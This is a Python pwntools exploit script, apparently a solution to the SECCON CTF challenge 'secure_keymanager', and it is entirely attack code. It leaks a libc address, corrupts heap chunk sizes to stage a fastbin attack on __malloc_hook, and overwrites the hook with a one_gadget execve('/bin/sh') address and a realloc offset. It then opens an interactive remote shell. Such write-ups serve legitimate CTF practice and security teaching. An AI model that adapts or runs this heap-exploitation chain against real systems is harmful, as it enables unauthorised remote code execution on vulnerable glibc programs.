from pwn import *

#context.log_level = "debug"
HOST = "secure_keymanager.pwn.seccon.jp"
PORT = 47225
conn = remote(HOST ,PORT)
#conn = process("./secure_keymanager")#, env={"LD_PRELOAD":"./libc-2.23.so"})
conn.sendafter(">> ", "A" * 0x8 + "\x71")
conn.sendafter(">> ", "A" * 0x8)
conn.sendlineafter(">> ", "4")
conn.sendafter(">> ", "A" * 0x18)
conn.recvuntil("A" * 0x18)
LEAK = u64(conn.recv(6) + "\x00" * 2)
log.success("LEAK :0x%x" % LEAK)
#leak: 0x7f3df084281b
#libc_base: 0x7f3df07c8000
LIBC = LEAK - (0x7f3d084281b - 0x7f3d07c8000)
log.success("LIBC :0x%x" % LIBC)
#00000000003c4b10 V __malloc_hook
MALLOC_HOOK = LIBC + 0x3c4b10
log.success("MALLOC_HOOK :0x%x" % MALLOC_HOOK)
#00000000003c67a8 V __free_hook
FREE_HOOK = LIBC + 0x3c67a8
log.success("FREE_HOOK :0x%x" % FREE_HOOK)
for i in range(2):
    conn.sendlineafter(">> ", "1")
    conn.sendlineafter("...", str(0x68 - 0x20))
    conn.sendafter("...", "A" * 0x1f)
    conn.sendafter("...", "A" * (0x67 - 0x20))
conn.sendlineafter(">> ", "1")
conn.sendlineafter("...", str(0x68))
conn.sendafter("...", "A" * 0x1f)
conn.sendafter("...", "A" * 0x67)
conn.sendlineafter(">> ", "4")
conn.sendlineafter(">>", "A" * 0x8 + "\x71" + "\x00")
conn.sendlineafter(">>", "A" * 0x8 + "\x00")
conn.sendlineafter("...", str(1))
conn.sendlineafter(">> ", "4")
conn.sendlineafter(">>", "A" * 0x8 + "\x71" + "\x00")
conn.sendlineafter(">>", "A" * 0x8 + "\x00")
conn.sendlineafter("...", str(0))
conn.sendlineafter(">> ", "4")
conn.sendlineafter(">>", "A" * 0x8 + "\x71" + "\x00")
conn.sendlineafter(">>", "A" * 0x8 + "\x00")
conn.sendlineafter("...", str(1))
conn.sendlineafter(">> ", "1")
conn.sendlineafter("...", str(0x68 - 0x20))
conn.sendafter("...", p64(MALLOC_HOOK - 0x23))
conn.sendafter("...", "A" * (0x67 - 0x20))
conn.sendlineafter(">> ", "1")
conn.sendlineafter("...", str(0x68 - 0x20))
conn.sendafter("...", "Pwn")
conn.sendafter("...", "A" * (0x67 - 0x20))
conn.sendlineafter(">> ", "1")
conn.sendlineafter("...", str(0x68 - 0x20))
conn.sendafter("...", "Pwn")
conn.sendafter("...", "A" * (0x67 - 0x20))
conn.sendlineafter(">> ", "1")
conn.sendlineafter("...", str(0x68 - 0x20))
#0x45216	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
#00000000000846c0 T realloc
conn.sendafter("...", "\x00" * 0xb + p64(LIBC + 0x4526a) + p64(LIBC + 0x846c0))
conn.sendline("")
conn.interactive()
